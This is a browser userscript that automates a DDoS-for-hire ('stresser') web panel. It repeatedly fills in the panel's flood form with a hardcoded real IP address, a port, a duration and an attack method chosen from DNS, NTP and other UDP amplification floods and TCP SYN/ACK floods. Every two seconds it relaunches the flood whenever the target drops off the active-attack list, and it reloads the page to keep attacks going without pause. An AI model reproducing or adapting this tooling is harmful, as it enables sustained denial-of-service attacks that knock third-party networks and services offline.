// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      2024-08-18
// @description  try to take over the world!
// @author       You
// @match        http*://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=stresser.zone
// @grant        none
// ==/UserScript==


//UDP
// index 0 = DNS 53
// index 1 = NTP 123
// index 2 = WSD 3702
// index 3 = ARD 3283
// index 4 = SADP37020
//TCP
// index 5 = SYN
// index 6 = ACK

var iptarget1="103.222.255.36";
var porttarget1="53";
var waktu1="120";
var methode1="0"

var iptarget2="";
var porttarget2="123";
var waktu2="120";
var methode2="1"

var autoddos1 = setInterval(function (){
    if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget1)||iptarget1 ==""){
        return
    }
    document.getElementById("hostL4").value = iptarget1
    document.getElementById("portL4").value = porttarget1
    document.getElementById("timeL4").value = waktu1
    document.getElementById("methodL4").selectedIndex = methode1

        L4btn('flood', '');

},2000)

var autoddos2 = setInterval(function (){
    if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget2)||iptarget2 ==""){
        return
    }
    document.getElementById("hostL4").value = iptarget2
    document.getElementById("portL4").value = porttarget2
    document.getElementById("timeL4").value = waktu2
    document.getElementById("methodL4").selectedIndex = methode2

        L4btn('flood', '');

},2000)
window.setTimeout( function() {
  window.location.reload();
}, 10000);
